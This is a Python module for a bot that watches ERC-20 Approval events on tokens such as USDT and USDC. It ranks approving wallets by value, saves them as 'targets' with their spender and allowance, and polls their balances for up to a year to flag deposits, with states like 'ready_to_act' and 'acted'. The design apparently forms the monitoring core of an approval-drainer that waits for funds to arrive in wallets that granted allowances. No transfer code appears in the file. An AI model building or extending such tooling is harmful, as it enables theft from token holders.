"""
Blockchain Approval Event Monitor Bot - FIXED VERSION
Monitors ERC-20 token approvals for popular tokens (USDT, USDC, etc.)
With advanced filtering, wallet analysis, and PERSISTENT ZERO-BALANCE MONITORING
"""

import json
import logging
import time
import threading
import sqlite3
from datetime import datetime, timedelta
from web3 import Web3
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, asdict, field
from enum import Enum
import os

os.makedirs('logs', exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/approvals.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class WalletStatus(Enum):
    WORTHLESS = "worthless"
    LOW_VALUE = "low_value"
    MEDIUM_VALUE = "medium_value"
    HIGH_VALUE = "high_value"
    WHALE = "whale"


class MonitoringStatus(Enum):
    WAITING_FOR_DEPOSIT = "waiting_for_deposit"
    HAS_BALANCE = "has_balance"
    READY_TO_ACT = "ready_to_act"
    EXPIRED = "expired"
    ACTED = "acted"


ERC20_ABI = [
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "name": "owner", "type": "address"},
            {"indexed": True, "name": "spender", "type": "address"},
            {"indexed": False, "name": "value", "type": "uint256"}
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [
            {"name": "_owner", "type": "address"},
            {"name": "_spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    }
]

# Imported from config to avoid duplication
try:
    from utils.config import POPULAR_TOKENS
except ImportError:
    # Fallback if running standalone or path issues
    import sys
    import os
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from utils.config import POPULAR_TOKENS

FILTER_CONFIG = {
    "min_wallet_value_usd": 100,
    "min_tx_count": 1,
    "min_eth_balance": 0.001,
    "require_unlimited_approval": False,
    "monitor_interval_seconds": 10,
    "value_thresholds": {
        "low": 100,
        "medium": 1000,
        "high": 10000,
        "whale": 100000
    }
}

PERSISTENT_MONITOR_CONFIG = {
    "check_interval_seconds": 1,
    "max_wait_days": 365,
    "min_balance_to_trigger": 1.0,
    "priority_check_interval": 0.5,
    "normal_check_interval": 5,
    "batch_size": 200,
    "alert_on_deposit": True,
    "auto_remove_after_action": False
}


@dataclass
class PersistentTarget:
    """A wallet being monitored persistently for deposits"""
    address: str
    token_address: str
    token_symbol: str
    spender: str
    allowance: int
    decimals: int
    added_at: str
    last_checked: str
    check_count: int
    status: MonitoringStatus
    last_balance: float
    current_balance: float
    max_balance_seen: float
    deposit_detected_at: Optional[str]
    priority: int
    notes: str
    
    def to_dict(self) -> Dict:
        result = asdict(self)
        result['status'] = self.status.value
        return result
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'PersistentTarget':
        data['status'] = MonitoringStatus(data['status'])
        return cls(**data)
    
    def days_waiting(self) -> float:
        added = datetime.fromisoformat(self.added_at)
        return (datetime.now() - added).total_seconds() / 86400


class PersistentMonitorDB:
    """SQLite database for persistent monitoring - survives restarts"""
    
    def __init__(self, db_path: str = "persistent_monitor.db"):
        self.db_path = db_path
        self._lock = threading.Lock()
        self._init_db()
    
    def _init_db(self):
        """Initialize database tables"""
        with self._lock:
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS targets (
                        address TEXT PRIMARY KEY,
                        token_address TEXT,
                        token_symbol TEXT,
                        spender TEXT,
                        allowance TEXT,
                        decimals INTEGER,
                        added_at TEXT,
                        last_checked TEXT,
                        check_count INTEGER DEFAULT 0,
                        status TEXT DEFAULT 'waiting_for_deposit',
                        last_balance REAL DEFAULT 0,
                        current_balance REAL DEFAULT 0,
                        max_balance_seen REAL DEFAULT 0,
                        deposit_detected_at TEXT,
                        priority INTEGER DEFAULT 5,
                        notes TEXT DEFAULT ''
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS balance_history (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        address TEXT,
                        token_symbol TEXT,
                        balance REAL,
                        timestamp TEXT,
                        FOREIGN KEY (address) REFERENCES targets(address)
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS deposit_events (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        address TEXT,
                        token_symbol TEXT,
                        old_balance REAL,
                        new_balance REAL,
                        deposit_amount REAL,
                        detected_at TEXT,
                        acted_upon INTEGER DEFAULT 0,
                        FOREIGN KEY (address) REFERENCES targets(address)
                    )
                ''')
                
                cursor.execute('''
                    CREATE INDEX IF NOT EXISTS idx_targets_status 
                    ON targets(status)
                ''')
                cursor.execute('''
                    CREATE INDEX IF NOT EXISTS idx_targets_priority 
                    ON targets(priority DESC)
                ''')
                
                conn.commit()
            except Exception as e:
                logger.error(f"Database initialization error: {e}")
            finally:
                if 'conn' in locals():
                    conn.close()
    
    def add_target(self, target: PersistentTarget):
        """Add new target to monitor"""
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute('''
                    INSERT OR REPLACE INTO targets 
                    (address, token_address, token_symbol, spender, allowance, decimals,
                     added_at, last_checked, check_count, status, last_balance, 
                     current_balance, max_balance_seen, deposit_detected_at, priority, notes)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    target.address.lower(),
                    target.token_address,
                    target.token_symbol,
                    target.spender,
                    str(target.allowance),
                    target.decimals,
                    target.added_at,
                    target.last_checked,
                    target.check_count,
                    target.status.value,
                    target.last_balance,
                    target.current_balance,
                    target.max_balance_seen,
                    target.deposit_detected_at,
                    target.priority,
                    target.notes
                ))
                
                conn.commit()
                logger.info(f"🎯 Added persistent target: {target.address} ({target.token_symbol})")
            except Exception as e:
                logger.error(f"Error adding target: {e}")
            finally:
                conn.close()
    
    def update_balance(self, address: str, new_balance: float, token_symbol: str):
        """Update balance and record history"""
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute('SELECT current_balance, max_balance_seen FROM targets WHERE address = ?', 
                               (address.lower(),))
                row = cursor.fetchone()
                
                if row:
                    old_balance = row[0]
                    max_balance = max(row[1], new_balance)
                    
                    cursor.execute('''
                        UPDATE targets 
                        SET last_balance = current_balance,
                            current_balance = ?,
                            max_balance_seen = ?,
                            last_checked = ?,
                            check_count = check_count + 1
                        WHERE address = ?
                    ''', (new_balance, max_balance, datetime.now().isoformat(), address.lower()))
                    
                    cursor.execute('''
                        INSERT INTO balance_history (address, token_symbol, balance, timestamp)
                        VALUES (?, ?, ?, ?)
                    ''', (address.lower(), token_symbol, new_balance, datetime.now().isoformat()))
                    
                    # ADVANCED DEPOSIT DETECTION (3 levels)
                    deposit_detected = False
                    deposit_amount = 0
                    detection_reason = ""
                    
                    # Level 1: Zero → Non-Zero (Primary deposit)
                    if new_balance > old_balance and old_balance == 0:
                        deposit_detected = True
                        deposit_amount = new_balance - old_balance
                        detection_reason = "primary_deposit_from_zero"
                    
                    # Level 2: Balance increased significantly (Secondary deposit while monitoring)
                    elif new_balance > old_balance and old_balance > 0:
                        increase_percent = ((new_balance - old_balance) / old_balance) * 100
                        if increase_percent >= 10:  # 10% or more increase = deposit
                            deposit_detected = True
                            deposit_amount = new_balance - old_balance
                            detection_reason = "secondary_deposit_significant_increase"
                    
                    # Level 3: Max balance exceeded (New funds added beyond previous max)
                    # row[1] is max_balance_seen BEFORE this update; max_balance is the new max.
                    # A genuine new-max deposit is when new_balance exceeds the old max_balance_seen
                    # AND was not already caught by Level 1 or Level 2.
                    if not deposit_detected and new_balance > row[1]:
                        deposit_detected = True
                        deposit_amount = new_balance - row[1]
                        detection_reason = "max_balance_exceeded"
                    
                    if deposit_detected:
                        logger.info(f"🎯 DEPOSIT DETECTED ({detection_reason}): {token_symbol} @ {address.lower()}")
                        logger.info(f"   Amount: {deposit_amount:.4f} | Old: {old_balance:.4f} → New: {new_balance:.4f}")
                        
                        cursor.execute('''
                            UPDATE targets 
                            SET status = ?,
                                deposit_detected_at = ?
                            WHERE address = ?
                        ''', (MonitoringStatus.HAS_BALANCE.value, 
                              datetime.now().isoformat(), 
                              address.lower()))
                        
                        cursor.execute('''
                            INSERT INTO deposit_events 
                            (address, token_symbol, old_balance, new_balance, deposit_amount, detected_at)
                            VALUES (?, ?, ?, ?, ?, ?)
                        ''', (address.lower(), token_symbol, old_balance, new_balance, 
                              deposit_amount, datetime.now().isoformat()))
                        
                        conn.commit()
                        return True, deposit_amount
                
                conn.commit()
                return False, 0
            except Exception as e:
                logger.error(f"Error updating balance: {e}")
                return False, 0
            finally:
                conn.close()
    
    def get_all_active_targets(self) -> List[PersistentTarget]:
        """Get all targets that are actively being monitored"""
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute('''
                    SELECT * FROM targets 
                    WHERE status IN (?, ?)
                    ORDER BY priority DESC, added_at ASC
                ''', (MonitoringStatus.WAITING_FOR_DEPOSIT.value, 
                      MonitoringStatus.HAS_BALANCE.value))
                
                rows = cursor.fetchall()
                
                targets = []
                for row in rows:
                    target = PersistentTarget(
                        address=row[0],
                        token_address=row[1],
                        token_symbol=row[2],
                        spender=row[3],
                        allowance=int(row[4]),
                        decimals=row[5],
                        added_at=row[6],
                        last_checked=row[7],
                        check_count=row[8],
                        status=MonitoringStatus(row[9]),
                        last_balance=row[10],
                        current_balance=row[11],
                        max_balance_seen=row[12],
                        deposit_detected_at=row[13],
                        priority=row[14],
                        notes=row[15]
                    )
                    targets.append(target)
                
                return targets
            except Exception as e:
                logger.error(f"Error getting targets: {e}")
                return []
            finally:
                conn.close()
    
    def update_status(self, address: str, new_status: MonitoringStatus):
        """Update the status of a target"""
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            try:
                cursor.execute(
                    'UPDATE targets SET status = ? WHERE address = ?',
                    (new_status.value, address.lower())
                )
                conn.commit()
            except Exception as e:
                logger.error(f"Error updating status for {address}: {e}")
            finally:
                conn.close()

    def get_statistics(self) -> Dict:
        """Get monitoring statistics"""
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute('SELECT COUNT(*) FROM targets')
                total = cursor.fetchone()[0]
                
                cursor.execute('SELECT COUNT(*) FROM targets WHERE status = ?',
                               (MonitoringStatus.WAITING_FOR_DEPOSIT.value,))
                waiting = cursor.fetchone()[0]
                
                cursor.execute('SELECT COUNT(*) FROM targets WHERE status = ?',
                               (MonitoringStatus.HAS_BALANCE.value,))
                has_balance = cursor.fetchone()[0]
                
                cursor.execute('SELECT COUNT(*) FROM targets WHERE status = ?',
                               (MonitoringStatus.ACTED.value,))
                acted = cursor.fetchone()[0]
                
                cursor.execute('SELECT SUM(check_count) FROM targets')
                total_checks = cursor.fetchone()[0] or 0
                
                cursor.execute('SELECT COUNT(*) FROM deposit_events')
                deposits_detected = cursor.fetchone()[0]
                
                return {
                    "total_targets": total,
                    "waiting_for_deposit": waiting,
                    "has_balance": has_balance,
                    "acted_upon": acted,
                    "total_balance_checks": total_checks,
                    "deposits_detected": deposits_detected,
                }
            except Exception as e:
                logger.error(f"Error getting statistics: {e}")
                return {}
            finally:
                conn.close()
